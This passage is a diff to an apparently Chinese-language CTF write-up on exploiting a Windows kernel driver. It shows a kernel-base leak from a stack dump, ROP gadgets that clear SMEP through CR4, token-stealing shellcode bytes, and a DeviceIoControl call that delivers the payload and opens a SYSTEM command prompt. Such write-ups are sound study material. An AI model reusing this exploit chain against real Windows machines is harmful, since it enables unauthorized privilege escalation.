+    ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+    ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+    ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+    ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+    ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+    ffff950a`a6efb810  00000000`00000000 00000000`00000001
+    ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+    ffff950a`a6efb830  00000000`00000001
+    
+    kd> lm m nt
+    start             end                 module name
+    fffff800`08c00000 fffff800`09c46000   nt         (pdb symbols)          C:\ProgramData\dbg\sym\ntkrnlmp.pdb\D9424FC4861E47C10FAD1B35DEC6DCC81\ntkrnlmp.pdb
+    ```
+    
+    在 ffff950a\`a6efb790 上，有一個指標 fffff800\`0961a301 在 ntoskrnl (nt) 的記憶體範圍內，並且指向 ntoskrnl.exe + 0xA1A301 (偏移值不同版本的機器可能會不太一樣) 所以我們只需要從 stack_dump 中抓這個指標然後扣掉 0xA1A301 就可以得到 ```ntoskrnl.exe``` 的基底，也就是 kernel base 了。
+    
+    ```c++
+    uintptr_t kernel_base = stack_ptrs[33] - 0xA1A301;
+    printf("Nt module base at 0x%llx\n", kernel_base);
+    ```
+    
+    最後是兩個 ROP Gadget 的偏移 :
+    
+    pop rcx; ret -> ntoskrnl.exe + 0x2148c8
+    
+    mov cr4, rcx -> ntoskrnl.exe + 0x3A0A87
+
+* ### Payload Construction, Initial Proof-Of-Concept:
+    開始寫 payload 前，記得傳入的位址資料要先與 XOR Key 做 XOR，否則原本的值會被改變:
+    ```c++
+    #define ADDR(x) ((x) ^ xor_key)
+    ```
+    建構 Payload:
+    ```c++
+    uintptr_t payload[74] {};
+    for(int i = 36; i >= 31; i--){
+        payload[i] = ADDR(stack_ptrs[i]);
+    }
+    
+    payload[37] = ADDR(kernel_base + 0x2148c8); //pop rcx, ret
+    payload[38] = ADDR(0x50ef0);
+    payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
+    ```
+    然後把之前得那支提權 shellcode 組譯，這裡推薦 [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) ，它有支援 C 字串格式的組譯輸出，很方便。
+    然後把組譯結果放到 POC 中，並且把第 54 和 55 個位元組換成目前的程序的 PID (使用 GetCurrentProcessId)
+    ```c++
+    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xC3";
+    
+    DWORD pid = GetCurrentProcessId();
+    
+    shellcode[54] = (char)pid;
+    shellcode[55] = (char)(pid >> 8);
+    ```
+    接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡，然後 IOCTL 完後再啟動一個 CMD 就大功告成啦! (原題解中只有 ```VirtualAlloc``` RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
+    ```c++
+    void start_process(){
+        puts("Exploit done, waiting for command prompt...\n");
+        system("cmd.exe");
+    }
+    ```
+    ```c++
+    PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(shellcode_addr, shellcode, sizeof(shellcode));
+    
+    printf("Shellcode at 0x%llx\n", (uintptr_t)shellcode);
+    payload[40] = ADDR((uintptr_t)shellcode_addr);
+    
+    DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL); //Send our payload!
+    
+    ```
+
+* ### The End?
+    做完POC後，我迫不及待的執行，成功-咦...
+    <figure>
+        <video width="640" height="360" controls>
+          <source src="https://lompandi.github.io/posts/post3/vids/failed.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+        <figcaption>看好了觀眾們! 我只會示範一次...</figcaption>
+    </figure>
+    
+    為甚麼啊😭? 後來我發現我沒恢復堆疊框架導至它執行完 shellcode 後就不知道要幹嘛了，而恢復 stack frame 又很麻煩(我很懶) 正當我一籌莫展時，我看到了古人留下來的題解...
 
 * ### 既來之，則安之
     《論語． 季氏》的解題方式這樣寫: 「遠人不服，則脩文德以來之。既來之，則安之。」，
@@ -1513,18 +1524,21 @@ DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(p
         system("cmd.exe");
     }
     ```
-    
+
+* ### The End.
     最後結果:
     <figure>
         <video width="640" height="360" controls>
           <source src="https://lompandi.github.io/posts/post3/vids/success.mp4" type="video/mp4">
           Your browser does not support the video tag.
         </video>
-        <figcaption沒有討喜的藍色畫面了，真難過... </figcaption>
+        <figcaption>沒有討喜的藍色畫面了，真難過... </figcaption>
     </figure>
     
-    最後是完整的POC:
+    完整的POC:
     ```c++
+    #define WIN32_LEAN_AND_MEAN
+    
     #include <windows.h>
     #include <cstdio>
 
